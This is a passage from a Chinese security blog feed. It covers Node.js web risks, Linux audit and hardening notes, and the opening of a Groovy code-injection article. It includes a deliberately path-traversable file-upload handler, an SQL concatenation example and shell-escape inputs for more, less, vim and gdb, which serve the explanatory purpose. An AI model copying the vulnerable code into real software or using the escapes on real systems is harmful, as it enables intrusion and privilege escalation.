</span><br><span class="line">password: <span class="string">'root'</span>,</span><br><span class="line">port: <span class="string">'3306'</span>, </span><br><span class="line">database: <span class="string">'admin'</span>, &#125;) ; </span><br><span class="line">connection.connect( ); </span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">'select * from admin where id =?'</span><span class="string">'; </span></span><br><span class="line"><span class="string">Var  param=[1];</span></span><br><span class="line"><span class="string">connection.query( sql，param); </span></span><br><span class="line"><span class="string">connection.end( );</span></span><br></pre></td></tr></table></figure><blockquote><p>Node.js现在已经有了orm框架（比如Sequelize），因此注入漏洞就跟少了。但是如果程序员写代码时不小心用了字符串拼接，还是会造成sql注入的。如下：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>  <span class="keyword">where</span> <span class="keyword">id</span>=$<span class="keyword">id</span></span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>Node.js的网站由于特有的路由规则，它的的上传问题虽然不像php、jsp、asp等脚本语言，若攻击者上传若未经过滤的脚本，便可轻松的拿到shel。但是代码中若存在路径跳转漏洞，攻击者可以直接将shell脚本木马上传到/etc/rc.d等启动项下面,或者是直接上传相应的index.js文件覆盖到第三方模块express等目录下，通过精心构造的js文件也能实现命令执行的目的。</p></blockquote><p>文件上传示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line">app.use(multer(&#123; <span class="attr">dest</span>: <span class="string">'E:/'</span>&#125;).array(<span class="string">'image'</span>));</span><br><span class="line">app.use(express.static(<span class="string">'public'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.files[<span class="number">0</span>]);  <span class="comment">// 上传的文件信息</span></span><br><span class="line"><span class="keyword">var</span> des_file = __dirname + <span class="string">'/'</span> + req.files[<span class="number">0</span>].originalname;</span><br><span class="line">fs.readFile( req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">fs.writeFile(des_file, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>( err )&#123;</span><br><span class="line"><span class="built_in">console</span>.log( err );</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">response = &#123;</span><br><span class="line">message:<span class="string">'File uploaded successfully'</span>,</span><br><span class="line">filename:req.files[<span class="number">0</span>].originalname</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( response );</span><br><span class="line">res.end( <span class="built_in">JSON</span>.stringify( response ) );</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>uploadfile.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>File<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Upload File: <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8181/"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"image"</span> <span class="attr">size</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传文件示例：</p><p><img src="/2020/03/29/浅析Node-js安全/11.png" alt=""></p><h3 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h3><blockquote><p>任何人都可以创建模块发布到npm上，供别人调用，虽然这为开发者带来了一定的便利性，但必然隐藏着安全隐患，假如一不小心使用了不安全的第三方模块后果可想而知了，比如前段时间闹得沸沸扬扬的node-serialize模块所引起的远程代码执行漏洞（cve-2017-5914）。现在有一款NSP 工具可以帮助检查第三方模块现有漏洞。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i nsp –g //安装nsp</span><br><span class="line">nsp check 要检查的package.json //检查是否有漏洞</span><br></pre></td></tr></table></figure><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>可参考：<a href="http://localhost:4000/2020/03/29/node-serialize反序列化漏洞/" target="_blank" rel="noopener">《node-serialize反序列化漏洞》</a>。</p><h2 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h2><p>参考：<a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.freebuf.com/articles/web/152891.html" target="_blank" rel="noopener">浅谈Node.js Web的安全问题</a></p><p><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">渗透测试 Node.js 应用</a></p><p><a href="https://zhuanlan.zhihu.com/p/25894270" target="_blank" rel="noopener">实战教你如何利用NodeJS 漏洞？</a></p><p><a href="https://resources.infosecinstitute.com/penetration-testing-node-js-applications-part-1/" target="_blank" rel="noopener">An Introduction to Penetration Testing Node.js Applications</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Linux安全笔记</title>
    <link href="https://www.mi1k7ea.com/2020/03/28/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.mi1k7ea.com/2020/03/28/Linux安全笔记/</id>
    <published>2020-03-28T13:33:27.000Z</published>
    <updated>2020-03-28T17:08:28.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Linux中一些基础安全问题的排查笔记。</p><h2 id="0x01-已知CVE漏洞"><a href="#0x01-已知CVE漏洞" class="headerlink" title="0x01 已知CVE漏洞"></a>0x01 已知CVE漏洞</h2><p>Linux最大的安全问题就是自带的重要组件及内核存在已知CVE漏洞。</p><ul><li>对于Linux Server，可查询供应商的补丁版本情况，与被测版本进行对比。</li><li>对于嵌入式Linux，可及时跟踪cvedetails网站，关注kernel、glibc、openssl、bash、openssh等重要组件的CVE漏洞情况。</li></ul><h2 id="0x02-进程权限管理"><a href="#0x02-进程权限管理" class="headerlink" title="0x02 进程权限管理"></a>0x02 进程权限管理</h2><h3 id="业务进程以root权限运行"><a href="#业务进程以root权限运行" class="headerlink" title="业务进程以root权限运行"></a>业务进程以root权限运行</h3><p>用<code>ps</code>命令列出Linux中所有进程信息，逐个确认以root权限运行的进程是否为必要的，应尽量满足最小权限原则。</p><h3 id="业务进程以root启动但使用seteuid进行伪装"><a href="#业务进程以root启动但使用seteuid进行伪装" class="headerlink" title="业务进程以root启动但使用seteuid进行伪装"></a>业务进程以root启动但使用seteuid进行伪装</h3><p>在Linux下有4个UID：RUID（real user id，实际用户ID）、EUID（effective user id，有效用户ID）、SUID（saved user id，保存的设置用户ID）、SUID（set user id），其具体区别如下：</p><ol><li>RUID，用于在系统中标识一个用户是谁，当用户使用用户名和密码成功登录后一个Linux系统后就唯一确定了他的RUID；</li><li>EUID，用于系统决定用户对系统资源的访问权限，通常情况下等于RUID；</li><li>SUID（set user id），用于对外权限的开放。跟RUID及EUID是用一个用户绑定不同，它是跟文件而不是跟用户绑定；</li><li>saved uid，这个实际上是一个虚拟概念，其对应的实际上还是RUID和SUID，只是在不同身份之间切换时变成对应的值；</li></ol><p>在Linux中设置uid的几个函数如下。</p><p>int setuid(uid_t uid) ：</p><ul><li>若进程具有超级用户权限，则setuid将实际用户ID、有效用户ID及保存的设置用户ID设置为uid </li><li>若进程没有超级用户权限，但是uid等于实际用户ID或保存的设置用户ID，则setuid只将有效用户ID设置为uid</li></ul><p>int seteuid(uid_t uid) ：</p><ul><li>若进程具有超级用户权限，则setuid只将有效用户ID设置为uid </li><li>若进程没有超级用户权限，则setuid只将有效用户ID设置为uid，但是uid必须等于实际用户ID或保存的设置用户ID</li></ul><p>int setreuid(uid_t ruid, uid_t euid) ：</p><ul><li>针对设置用户ID位的程序: 交换有效用户ID和保存的设置用户ID</li><li>针对没有设置用户ID位的程序: 交换有效用户ID和实际用户ID</li></ul><p><strong>setuid()与seteuid()的区别</strong></p><p>setuid()用来重新设置执行目前进程的用户识别码。不过，要让此函数有作用，其有效的用户识别码必须为0(root)。在Linux下，当root使用setuid()来变换成其他用户识别码时，root权限会被抛弃，完全转换成该用户身份。也就是说，该进程往后将不再具有可setuid()的权利，如果只是向暂时抛弃root 权限，稍后想重新取回权限，则必须使用seteuid()。</p><p><strong>问题场景</strong></p><p>某些场景下，在启动业务进程时，以root用户运行，但在初始化结束后调用seteuid降为普通用户，使用<code>ps</code>命令查看时对应的进程用户显示为普通用户。但是，此时业务进程可以在任何时候调用seteuid切换为root用户。</p><p>这种情况尤为需要警惕，因为业务进程实际上是具备root权限的，只是使用seteuid进行伪装而已。</p><p>排查方法：使用IDA打开业务进程对应的二进制文件（含所依赖的动态库），查看其中是否存在调用seteuid，若有则表示进行在运行中会随时切换用户。</p><h2 id="0x03-文件访问权限"><a href="#0x03-文件访问权限" class="headerlink" title="0x03 文件访问权限"></a>0x03 文件访问权限</h2><h3 id="系统存在未授权的suid权限的程序"><a href="#系统存在未授权的suid权限的程序" class="headerlink" title="系统存在未授权的suid权限的程序"></a>系统存在未授权的suid权限的程序</h3><p>在Linux中，SUID是Set User ID，SGID是Set Group ID。suid意味着如果A用户对属于他自己的shell脚本文件设置了这种权限，那么其他用户在执行这个脚本的时候就拥有了A用户的权限。所以，如果root用户对某一脚本设置了这一权限的话则其他用户执行该脚本的时候则拥有了root用户权限。同理，guid意味着执行相应脚本的用户则拥有了该文件所属用户组中用户的权限。</p><p>系统会自带一些具备suid权限位的程序，特征就是代表execute权限位的”x”为”s”，例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ski12@ubuntu:~$ ls -l /usr/bin/passwd </span><br><span class="line">-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd</span><br><span class="line">ski12@ubuntu:~$</span><br></pre></td></tr></table></figure><p>若一个二进制文件本来无可执行权限，却又被增加了suid权限位，对应的execute权限位就是大写的”S”，出现这种情况一般是文件权限设定错误，在文件没有可执行权限时，没有危害，但还是需要去除suid权限位。</p><p>需要关注的是那些无需suid权限位的二进制文件被设置了suid权限，可以使用find命令将系统中属主为root的suid权限的文件找出来，逐个确认：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -user root -perm -4000 -print</span><br></pre></td></tr></table></figure><p><img src="/2020/03/28/Linux安全笔记/1.png" alt=""></p><p>同样的，具备sgid权限的二进制文件，表示在执行过程中会获取二进制文件所属group权限，查找命令如下，对列出的文件逐个确认即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -2000 -print</span><br></pre></td></tr></table></figure><p><img src="/2020/03/28/Linux安全笔记/2.png" alt=""></p><h3 id="属主为普通用户的二进制文件被root执行"><a href="#属主为普通用户的二进制文件被root执行" class="headerlink" title="属主为普通用户的二进制文件被root执行"></a>属主为普通用户的二进制文件被root执行</h3><p>若属主为普通用户的文件或普通用户具有写权限的文件，当root在某些场景下会自发运行该可执行文件时，如果普通用户往文件内容中插入恶意代码，则会造成提权等安全问题。</p><p>另外，Crontab定时任务所执行的脚本或命令同样是需要重点排查的对象。</p><h3 id="普通用户拥有设备文件的读写权限"><a href="#普通用户拥有设备文件的读写权限" class="headerlink" title="普通用户拥有设备文件的读写权限"></a>普通用户拥有设备文件的读写权限</h3><p>除了/dev/zero、/dev/random、/dev/null等一些公用设备，大部分设备普通用户是不能有读写权限的，具体情况具体分析。</p><h2 id="0x04-用户管理"><a href="#0x04-用户管理" class="headerlink" title="0x04 用户管理"></a>0x04 用户管理</h2><h3 id="用户口令安全"><a href="#用户口令安全" class="headerlink" title="用户口令安全"></a>用户口令安全</h3><p>建议系统及相关组件服务的用户口令至少满足如下要求：</p><ul><li>口令长度&gt;=6个字符；</li><li>口令必须至少包含一个大写字母、小写字母和数字；</li><li>口令不能是连续的数字或同样的字母；</li><li>口令不能和账号明显关联；</li></ul><p>排查方法：</p><ol><li>查看系统的密码复杂度设置；</li><li>修改用户密码，检测是否校验旧密码，是否对新密码进行复杂度校验；</li></ol><h3 id="普通用户具有过多权限"><a href="#普通用户具有过多权限" class="headerlink" title="普通用户具有过多权限"></a>普通用户具有过多权限</h3><p>普通用户具备过多权限会引起越权问题，如在管理群组中uid为0等。</p><p>排查方法：</p><ol><li>查看系统/etc/passwd文件中的用户定义，是否存在多个uid为0的用户；</li><li>查看/etc/group文件，root组中是否包含多余用户；</li></ol><h3 id="sudo配置错误导致普通用户可提权执行任意命令"><a href="#sudo配置错误导致普通用户可提权执行任意命令" class="headerlink" title="sudo配置错误导致普通用户可提权执行任意命令"></a>sudo配置错误导致普通用户可提权执行任意命令</h3><p>sudo用于以另一用户的身份执行指定的命令，可执行的命令在sudoer配置文件中指定。由于配置疏忽，提供了一些通用命令，攻击者可以利用这些通用命令进行组合，越权更改系统配置文件。另一个错误点为指定的命令是一个脚本，而普通用户具备该脚本的权限，从而执行任意命令。</p><p>通过查看sudo配置文件是否包含targetpw来排查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep targetpw /etc/sudoers</span><br></pre></td></tr></table></figure><p>如果无输出，或者输出的行以<code>#</code>开头，则表示启用了sudo。接着执行visudo命令，查看其中的命令列表是否存在<code>cp</code>、<code>chmod</code>等通用命令。</p><p>对于命令列表中的脚本，进一步排查脚本的属主和读写权限，要求属主是root，并且group和others无写权限。</p><h2 id="0x05-命令逃逸"><a href="#0x05-命令逃逸" class="headerlink" title="0x05 命令逃逸"></a>0x05 命令逃逸</h2><h3 id="shell逃逸"><a href="#shell逃逸" class="headerlink" title="shell逃逸"></a>shell逃逸</h3><p>如果在应用了具备执行外部shell命令的工具，存在通过执行外部命令逃逸处应用的风险。</p><h4 id="more命令逃逸"><a href="#more命令逃逸" class="headerlink" title="more命令逃逸"></a>more命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="less命令逃逸"><a href="#less命令逃逸" class="headerlink" title="less命令逃逸"></a>less命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="vi-vim命令逃逸"><a href="#vi-vim命令逃逸" class="headerlink" title="vi/vim命令逃逸"></a>vi/vim命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="gdb命令逃逸"><a href="#gdb命令逃逸" class="headerlink" title="gdb命令逃逸"></a>gdb命令逃逸</h4><p><code>shell whoami</code>能逃逸到shell执行whoami命令。</p><h3 id="自定义shell界面存在逃逸"><a href="#自定义shell界面存在逃逸" class="headerlink" title="自定义shell界面存在逃逸"></a>自定义shell界面存在逃逸</h3><p>原理：有些自定义的产品在对用户展示信息时，有可能会调用外部的less、more等命令来实现的，若是这种场景则可能存在命令逃逸的风险。</p><p>排查方法：分析自定义的二进制文件所调用的system、exec、popen等函数的调用点，查看是否有执行具备外部逃逸命令行为的调用。</p><h2 id="0x06-本地提权"><a href="#0x06-本地提权" class="headerlink" title="0x06 本地提权"></a>0x06 本地提权</h2><p>当使用root用户访问低权限用户的目录时，低权限用户可以更改此目录为符号链接，指向自己没有权限操作的位置，达到改写任意文件的目的。</p><p>除此之外，当root用户运行属主为低权限用户的脚本或者低权限用户拥有写权限的脚本时，同样存在本地提权问题。</p><p>具体可参考：<a href="https://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/" target="_blank" rel="noopener">https://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/</a></p><h2 id="0x07-sysctl"><a href="#0x07-sysctl" class="headerlink" title="0x07 sysctl"></a>0x07 sysctl</h2><p>sysctl命令用于运行时配置内核参数，这些参数位于/proc/sys目录下。sysctl配置与显示在/proc/sys目录中的内核参数中。可以用sysctl来设置联网功能，如IP转发、源路由检查等。用户只需要编辑/etc/sysctl.conf文件即可手动或自动执行由sysctl控制的功能。</p><p>如下三种配置存在安全问题：</p><ul><li>设置net.ipv4.ip_forward=1，使得Linux不同网卡间报文可以转发，导致三面不隔离；</li><li>设置net.ipv4.conf.all.accept_redirects = 1，使得Linux接收ICMP redirect报文，会被中间人攻击；</li><li>没有设置net.ipv4.tcp_syncookies为1，不能防御TCP SYN Flood攻击；</li></ul><h2 id="0x08-系统配置"><a href="#0x08-系统配置" class="headerlink" title="0x08 系统配置"></a>0x08 系统配置</h2><h3 id="系统未做资源控制，普通用户消耗过多资源导致DoS"><a href="#系统未做资源控制，普通用户消耗过多资源导致DoS" class="headerlink" title="系统未做资源控制，普通用户消耗过多资源导致DoS"></a>系统未做资源控制，普通用户消耗过多资源导致DoS</h3><p>原理：系统资源会因为外部操作而明显消耗，导致DoS。这些资源包括文件句柄、内存、CPU、最大进程数、登录会话数等。</p><p>排查方法：</p><ol><li>分析外部接口，是否存在可被外部触发大量的资源消耗操作；</li><li>使用程序消耗大量系统资源，查看系统是否存在资源过载保护机制，正常业务是否明显受到影响，如用户无法登录、无法运行新进程等；</li></ol><h3 id="iptables规则存在被绕过的错误配置"><a href="#iptables规则存在被绕过的错误配置" class="headerlink" title="iptables规则存在被绕过的错误配置"></a>iptables规则存在被绕过的错误配置</h3><p>由于iptables规则设计不完善，可导致被绕过。</p><p>比如，一个虚拟机br网桥安全组规则片段如下：</p><p>规则1，允许UDP报文通过，源端口是68，目的端口是67：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-ofa960951-9 -p udp -m udp --sport 68 --dport 67 -j RETURN</span><br></pre></td></tr></table></figure><p>规则2，目的IP是100.64.0.0/10的全部丢弃报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-relay-cidr -d 100.64.0.0/10 -j DROP</span><br></pre></td></tr></table></figure><p>规则3，检测目的MAC与IP是否绑定，没有绑定则直接丢弃报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-openvswi-s0bff551f-2 -s 192.168.0.15/32 -m mac --mac-source FA:16:3E:71:F1:DD -j RETURN</span><br><span class="line">-a neutron-openvswi-s0bff551f-2 -j DROP</span><br></pre></td></tr></table></figure><p>上述安全组规则设计存在如下缺陷：由于规则2比规则1优先级低，恶意用户构造特殊报文会绕过目的IP为100.64.0.0某些协议的报文穿越到其他租户的VPC中，对不属于自己的虚拟机进行流量攻击，破坏VPC隔离性。</p><h3 id="系统对外的文件共享（nfs、samba）配置不当"><a href="#系统对外的文件共享（nfs、samba）配置不当" class="headerlink" title="系统对外的文件共享（nfs、samba）配置不当"></a>系统对外的文件共享（nfs、samba）配置不当</h3><p>执行<code>exportfs -av</code>命令，查看系统开启了哪些nfs共享并逐个确认。</p><p>查看/etc/samba/smb.conf，查看系统开启了哪些共享并逐个确认。</p><h3 id="建议禁止用户利用ssh做端口转发"><a href="#建议禁止用户利用ssh做端口转发" class="headerlink" title="建议禁止用户利用ssh做端口转发"></a>建议禁止用户利用ssh做端口转发</h3><p>ssh的端口转发功能会破坏网络隔离性，非必须的情况下建议默认禁止。</p><p>排查方法：查看/etc/ssh/ssh_config配置文件，确认端口转发功能是否已默认禁止，选项为<code>AllowTcpForwarding</code>。</p><h3 id="口令保存在-etc-passwd中"><a href="#口令保存在-etc-passwd中" class="headerlink" title="口令保存在/etc/passwd中"></a>口令保存在/etc/passwd中</h3><p>用户口令密文保存在/etc/passwd文件中，而不是/etc/shadow文件中。</p><p>/etc/passwd是全局可读的文件，若用户口令密文直接保存在该文件中将会导致用户密码可被工具暴力破解。</p><p>排查方法：直接查看/etc/passwd的内容是否存在用户口令密文。</p><h2 id="0x09-日志审计"><a href="#0x09-日志审计" class="headerlink" title="0x09 日志审计"></a>0x09 日志审计</h2><h3 id="日志文件可被普通用户修改"><a href="#日志文件可被普通用户修改" class="headerlink" title="日志文件可被普通用户修改"></a>日志文件可被普通用户修改</h3><p>日志文件用于审计，需要防止被普通用户修改。</p><p>排查方法：查看所有系统日志文件的访问权限，避免出现可被普通用户进行修改的权限。</p><h3 id="日志目录未处于独立分区，日志过多会导致占满整个磁盘"><a href="#日志目录未处于独立分区，日志过多会导致占满整个磁盘" class="headerlink" title="日志目录未处于独立分区，日志过多会导致占满整个磁盘"></a>日志目录未处于独立分区，日志过多会导致占满整个磁盘</h3><p>如题。</p><h3 id="系统是否监听UDP-514端口，能接收网络上发来的日志信息"><a href="#系统是否监听UDP-514端口，能接收网络上发来的日志信息" class="headerlink" title="系统是否监听UDP 514端口，能接收网络上发来的日志信息"></a>系统是否监听UDP 514端口，能接收网络上发来的日志信息</h3><p>对于非嵌入式Linux，开启了syslog服务后，会监听UDP 514端口，此时网络所发过来的日志都会被syslog记录，若日志量非常大时，会极大地消耗磁盘空间。</p><p>排查方法：<code>netstat -an | grep 514</code></p><p>如果有监听，则查看syslog日志是否保存在独立分区中，或者日志是否有做轮转。</p><h3 id="日志是否记录敏感信息"><a href="#日志是否记录敏感信息" class="headerlink" title="日志是否记录敏感信息"></a>日志是否记录敏感信息</h3><p>查看系统日志，使用关键字查找日志文件，是否有session、密码、token、地址、号码等用户敏感信息。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Linux" scheme="https://www.mi1k7ea.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.mi1k7ea.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>浅析Groovy代码注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/24/%E6%B5%85%E6%9E%90Groovy%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/24/浅析Groovy代码注入漏洞/</id>
    <published>2020-03-24T13:27:17.000Z</published>
    <updated>2020-03-26T13:52:08.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Groovy简介"><a href="#Groovy简介" class="headerlink" title="Groovy简介"></a>Groovy简介</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。</p><p>Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。</p><p>Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。）</p><p>Groovy有以下特点：</p><ul><li>同时支持静态和动态类型；</li><li>支持运算符重载；</li><li>本地语法列表和关联数组；</li><li>对正则表达式的本地支持；</li><li>各种标记语言，如XML和HTML原生支持；</li><li>Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似；</li><li>可以使用现有的Java库；</li><li>Groovy扩展了java.lang.Object；</li></ul><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>参考：<a href="https://www.w3cschool.cn/groovy/" target="_blank" rel="noopener">https://www.w3cschool.cn/groovy/</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载Groovy：<a href="http://groovy-lang.org/download.html" target="_blank" rel="noopener">http://groovy-lang.org/download.html</a></p><p>解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可。然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        println <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5种运行方式"><a href="#5种运行方式" class="headerlink" title="5种运行方式"></a>5种运行方式</h3><h4 id="groovyConsole图形交互控制台"><a href="#groovyConsole图形交互控制台" class="headerlink" title="groovyConsole图形交互控制台"></a>groovyConsole图形交互控制台</h4><p>在终端下输入<code>groovyConsole</code>启动图形交互控制台，在上面可以直接编写代码执行：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/1.png" alt=""></p><h4 id="groovysh-shell命令交互"><a href="#groovysh-shell命令交互" class="headerlink" title="groovysh shell命令交互"></a>groovysh shell命令交互</h4><p>在终端下输入<code>groovysh</code>启动一个shell命令行来执行Groovy代码的交互：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/2.png" alt=""></p><h4 id="用命令行执行Groovy脚本"><a href="#用命令行执行Groovy脚本" class="headerlink" title="用命令行执行Groovy脚本"></a>用命令行执行Groovy脚本</h4><p>在GROOVY_HOME\bin里有个叫“groovy”或“groovy.bat”的脚本文件，可以类似<code>python test.py</code>这种方式来执行Groovy脚本。</p><p>1.groovy：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println(<span class="string">"mi1k7ea"</span>)</span><br></pre></td></tr></table></figure><p>在Windows运行<code>groovy.bat 1.groovy</code>即可执行该Groovy脚本：</p><p><img src="/2020/03/24/浅析Groovy代码注入漏洞/3.png" alt=""></p><h4 id="通过IDE运行Groovy脚本"><a href="#通过IDE运行Groovy脚本" 